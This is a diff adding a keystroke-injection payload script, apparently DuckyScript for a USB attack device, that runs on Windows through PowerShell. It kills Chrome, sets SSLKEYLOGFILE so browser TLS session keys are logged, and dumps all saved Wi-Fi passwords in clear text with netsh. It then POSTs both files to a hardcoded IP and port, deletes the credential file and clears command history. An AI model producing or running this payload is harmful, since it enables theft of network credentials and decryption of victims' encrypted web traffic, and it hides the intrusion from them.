@@ -1,0 +1,58 @@
+REM Creds:
+REM Stop a single process in Windows by Aleff
+REM WLAN Windows Passwords by Aleff
+
+REM STEP 1 KILL ANY CHROME PROCESS
+DELAY 2000
+GUI r
+DELAY 750
+STRING powershell
+ENTER
+DELAY 1000
+STRING taskkill /im chrome.exe /f
+ENTER
+
+REM STEP 2 SET THE SSL KEY LOG FILE ENV VARIABLE
+STRING cd $HOME\Documents
+DELAY 750
+ENTER
+DELAY 750
+
+STRING SetX SSLKEYLOGFILE "$(get-location)\ssl.log"
+DELAY 750
+ENTER
+ALT F4
+
+GUI r
+DELAY 750
+STRING powershell
+ENTER
+DELAY 1000
+STRING & 'C:\Program Files\Google\Chrome\Application\chrome.exe' https://stackoverflow.com
+DELAY 750
+ENTER
+DELAY 1000
+
+
+REM STEP 3 KILL ANY CHROME PROCESS AGAIN
+DELAY 2000
+GUI r
+DELAY 750
+STRING powershell
+ENTER
+DELAY 1000
+STRING taskkill /im chrome.exe /f
+ENTER
+
+REM STEP 4 EXFILTRATE DATA
+DELAY 1000
+REM replace my ip addr and port in the following line
+STRING cd Documents
+ENTER
+STRING netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {$wlan  = $_.Matches.Value;$passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Key Content\s+:\s).+';$env:username >> creds.txt; $wlan>> creds.txt; $passw>>creds.txt}; Invoke-WebRequest -Method POST -InFIle creds.txt 192.168.1.6:9991; Invoke-WebRequest -Method POST -InFIle ssl.log 192.168.1.6:8000; rm creds.txt; Clear-History
+ENTER
+DELAY 15000
+
+ALT F4
+DELAY 500
+ALT F4
